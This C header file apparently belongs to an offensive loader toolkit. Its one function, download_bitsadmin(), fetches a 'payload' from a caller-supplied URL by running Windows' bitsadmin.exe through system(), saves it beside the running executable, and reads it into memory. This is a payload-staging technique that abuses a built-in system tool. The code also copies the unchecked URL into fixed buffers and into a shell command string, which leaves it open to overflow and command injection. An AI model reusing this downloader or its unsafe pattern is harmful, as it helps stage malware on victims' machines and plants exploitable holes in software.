#pragma once

#include <stdio.h>
#include <string.h>
#include <windows.h>
#include "../debug_print/debug_print.h"
#include "helper_functions/helper_functions.h"


// Downloads data from the URI specified in arg1 into a file, using the BITSADMIN Windows tool.
// The data is then read from the file and returned.
//
// data_size receives the size of the data in bytes.
unsigned char *download_bitsadmin(char *arg1, int *data_size) {
    DEBUG_PRINT("Downloading data to file via bitsadmin...\n");

    // File will be named as on the server
    char sh_filename[128];
    strcpy(sh_filename, get_filename_from_url(arg1));

    DEBUG_PRINT("sh_filename = %s\n", sh_filename);

    // Bitsadmin expects a full path.
    // Acquire full path + file name of this process.
    char current_path[MAX_PATH];
    GetModuleFileNameA(NULL, current_path, MAX_PATH);

    // Replace executable name with payload name (after last '\')
    // Array size MAX_PATH should be large enough
    strcpy((strrchr(current_path, '\\') + 1), sh_filename);
    
    DEBUG_PRINT("current_path = %s\n", current_path);

    char download[500];    // how not to do it...
    sprintf(download, "bitsadmin.exe /transfer \"WinBitsJob\" %s %s", arg1, current_path);

    DEBUG_PRINT("command: %s\n", download);
    system(download);
    DEBUG_PRINT("Download done.\n");

    *data_size = get_filesize(sh_filename);
    return load_textfile(sh_filename, *data_size);
}

























